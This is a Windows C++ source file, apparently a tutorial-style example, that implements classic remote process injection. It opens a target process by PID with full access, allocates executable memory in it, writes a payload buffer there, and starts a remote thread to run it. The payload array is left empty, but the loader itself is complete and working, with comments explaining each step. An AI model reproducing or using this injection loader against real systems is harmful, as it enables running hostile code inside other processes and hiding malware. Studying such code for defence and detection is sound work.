#include <windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
	DWORD PID = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID rBuffer = NULL;
	unsigned char payload[] = "";
	
	// Make sure an argument is supplied
	if (argc != 2) {
		printf("Usage: injection.exe <PID>\n");
		return EXIT_FAILURE;
	}

	// Set PID to supplied argument
	PID = atoi(argv[1]);
	printf("Attempting to open a handle to process PID: %ld\n", PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, // Lets request all access
		FALSE, // Don't need to inherit handles
		PID // Supply our PID
	);

	if (hProcess == NULL) {
		printf("Failed to get handle to process!\n");
		return EXIT_FAILURE;
	}
	else {
		printf("Succesfully got handle to process at address 0x%p\n", hProcess);
	}

	rBuffer = VirtualAllocEx(
		hProcess, // Pass the handle of the target process
		NULL,
		sizeof(payload), // Supply the size of our payload
		MEM_RESERVE | MEM_COMMIT, // The type of allocation. We need to reserve and commit memory
		PAGE_EXECUTE_READWRITE // We need permission to read, write, and execute the payload we inject
	);
	if (rBuffer == NULL)
	{
		printf("Failed to allocate memory to process!\n");
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	else {
		printf("Succesfully allocated %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);
	}

	WriteProcessMemory(
		hProcess, // Process handle
		rBuffer, // Pointer to base address
		payload, // Our actual payload
		sizeof(payload), // Size of our payload
		NULL
	);
	printf("Succesfully wrote %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);

	hThread = CreateRemoteThreadEx(
		hProcess, // Handle to our injected process
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) rBuffer, // The (Casted) starting address of our injected code
		NULL,
		0, // Specify that we want this thread to run immediately
		0,
		NULL
	);

	if (hThread == NULL) {
		printf("Failed to get handle to remote thread!\n");
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	else {
		printf("Got handle to remote thread at address 0x%p\n", hThread);
	}

	// Wait for our thread to terminate
	WaitForSingleObject(hThread, INFINITE);
	printf("Thread terminated\n");

	// Clean up our mess
	printf("Cleaning up...\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("Cleanup Complete\n");

	return EXIT_SUCCESS;
}